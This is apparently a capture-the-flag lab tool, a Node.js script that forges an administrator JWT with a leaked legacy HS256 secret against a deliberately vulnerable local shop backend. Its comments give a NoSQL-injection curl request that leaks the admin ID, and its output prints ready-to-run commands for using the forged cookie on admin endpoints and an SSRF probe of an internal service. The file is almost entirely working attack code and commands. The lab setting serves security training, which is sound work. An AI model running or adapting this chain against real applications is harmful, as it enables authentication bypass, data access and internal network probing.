// =============================================================================
// ProShop CTF Lab — JWT Algorithm Confusion Exploit
// lab-tools/forge_token.js
//
// STAGE 3: Forge an admin JWT using the LEGACY_SECRET discovered in .env.bak
//
// The target backend uses jsonwebtoken@8.5.1 without enforcing algorithm type.
// It will verify a HS256 token even if the system normally issues RS256 tokens.
// The middleware falls back to LEGACY_SECRET ("old-forgotten-secret-2024")
// if the primary secret fails — accepting our forged HS256 token.
//
// Usage:
//   node forge_token.js --adminId=<MONGO_OBJECTID> [--secret=<SECRET>]
//
// Example:
//   node forge_token.js --adminId=64abc123def4560012345678
//
// The admin ObjectId is discovered in Stage 3 via the NoSQL injection:
//   curl -b "jwt=<user_token>" \
//     "http://localhost:5000/api/support/%7B%22%24gt%22%3A999%7D"
// =============================================================================

const jwt = require('jsonwebtoken');

// ─── Parse CLI args ───────────────────────────────────────────────────────────
const args = Object.fromEntries(
  process.argv.slice(2).map((arg) => {
    const [k, v] = arg.replace('--', '').split('=');
    return [k, v];
  })
);

const LEGACY_SECRET = args.secret || 'old-forgotten-secret-2024';
const ADMIN_ID      = args.adminId;
const EXPIRY        = args.exp || '7d';

if (!ADMIN_ID) {
  console.error('\nUsage: node forge_token.js --adminId=<MONGO_OBJECTID> [--secret=<SECRET>]\n');
  console.error('  The adminId comes from the NoSQL injection in Stage 3:');
  console.error('  curl -b "jwt=<token>" "http://localhost:5000/api/support/%7B%22%24gt%22%3A999%7D"');
  console.error('  Look at the ticket.user field in the response.\n');
  process.exit(1);
}

// ─── Forge the token ─────────────────────────────────────────────────────────
// Algorithm: HS256 (symmetric) — signed with LEGACY_SECRET
// The backend's fallback branch accepts this when the primary RS256 check fails
const forgedPayload = {
  userId: ADMIN_ID,
  isAdmin: true,   // Note: backend reads isAdmin from DB, not token — but userId is key
  iat: Math.floor(Date.now() / 1000),
};

const forgedToken = jwt.sign(forgedPayload, LEGACY_SECRET, {
  algorithm: 'HS256',
  expiresIn: EXPIRY,
});

// ─── Decode for verification ──────────────────────────────────────────────────
const decoded = jwt.decode(forgedToken, { complete: true });

console.log('\n' + '='.repeat(70));
console.log(' ProShop CTF Lab — JWT Algorithm Confusion Exploit');
console.log('='.repeat(70));
console.log('\n[+] Forged Token Details:');
console.log(`    Algorithm : ${decoded.header.alg}`);
console.log(`    Secret    : ${LEGACY_SECRET}`);
console.log(`    Admin ID  : ${ADMIN_ID}`);
console.log(`    Expires   : ${EXPIRY}`);
console.log('\n[+] Forged JWT:');
console.log(`\n    ${forgedToken}\n`);
console.log('[+] Use this token as a cookie:');
console.log(`    curl -b "jwt=${forgedToken}" http://localhost:5000/api/admin/dashboard`);
console.log('\n[+] Or in Burp Suite / browser DevTools:');
console.log(`    document.cookie = "jwt=${forgedToken}; path=/"`);
console.log('\n[+] Verify admin access:');
console.log(`    curl -b "jwt=${forgedToken}" http://localhost:5000/api/users`);
console.log('\n[+] SSRF — Probe internal service:');
console.log(`    curl -b "jwt=${forgedToken}" \\`);
console.log(`      -X POST http://localhost:5000/api/admin/import-image \\`);
console.log(`      -H "Content-Type: application/json" \\`);
console.log(`      -d '{"imageUrl":"http://127.0.0.1:6000/status"}'`);
console.log('='.repeat(70) + '\n');
